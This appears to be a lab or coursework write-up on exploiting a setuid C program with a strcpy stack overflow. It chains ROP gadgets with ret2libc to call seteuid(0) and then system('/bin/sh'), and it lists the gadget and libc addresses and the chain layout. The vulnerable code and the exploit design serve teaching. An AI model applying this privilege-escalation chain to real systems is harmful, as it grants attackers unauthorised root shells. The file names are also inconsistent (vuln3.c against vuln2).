# Chained ret2libc/ROP

## Task
The goal is to exploit the following simple program, when compiled with the following commands:
```
vijay@kali> cat vuln3.c
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

int main(int argc, char* argv[]) {

  char buf[256];

  seteuid(getuid());     /* Drop privileges */

  strcpy(buf, argv[1]);
  printf("Input: %s\n", buf);

  return 0;
}
vijay@kali> gcc -g -fno-stack-protector -mpreferred-stack-boundary=2 -o vuln2 vuln2.c
vijay@kali> sudo chown root vuln2
vijay@kali> sudo chgrp root vuln2
vijay@kali> sudo chmod +s vuln2
```

The main challenge here is that the program drops its root privileges, so using the previous exploit this time will give a regular user shell. You can still exploit this program by chaining a call to seteuid(0) before spawning your shell ('man seteuid' for more details).

## Solution
### Instructions to run
```
# exploit vuln3.c
$ make clean && make vuln3
$ python exploit3.py
```
### Explanation
Here we need to chain the seteuid(0) fxn call before calling the system function. I found the fxn addresses by using similar approach as explained in Ret2Libc part.
```
seteuid_addr    = 0xb7ee28b0 # seteuid fxn address
system_addr     = 0xb7e3f850 # system fxn address
exit_addr       = 0xb7e336c0 # exit fxn address
bin_sh_str      = 0xb7f5de64 # "/bin/sh" string
```
To push the null bytes argument to seteuid fxn, I found the following gadgets using ROPgadget(https://github.com/JonathanSalwan/ROPgadget)
```
pop_ret         = 0xb7f46859 # pop; ret;
xor_eax_eax     = 0xb7e34a3b # make eax null
mov_esp_8_eax   = 0xb7e2ffd5 # mov null bytes to esp + 0x8 location
```

I chained the gadgets as shown below:
```
xor eax; eax; ret; | mov (esp)0x8 eax; ret; (write null bytes to seteuid arg) |
seteuid fxn address | pop; ret; | 0xffffffff (seteuid arg placeholder) |
system fxn address | exit fxn address | "/bin/sh" string address
```
Please refer to exploit3.py for complete details about the payload to exploit vuln3.c.
